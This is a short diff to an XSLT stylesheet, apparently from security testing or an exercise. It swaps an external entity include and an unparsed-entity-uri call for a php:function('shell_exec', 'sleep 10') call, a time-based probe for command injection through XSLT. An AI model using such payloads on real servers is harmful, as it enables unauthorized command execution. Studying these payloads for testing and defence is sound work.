@@ -8,11 +8,7 @@
 
     
     <div style="background-color:teal;color:white;padding:4px">
-      <xsl:value-of select="unparsed-entity-uri('currentpath')"/>
-    </div>
-
-    <div>
-      &include;
+      <xsl:value-of select="php:function('shell_exec', 'sleep 10')"/>
     </div>
 
     <div>
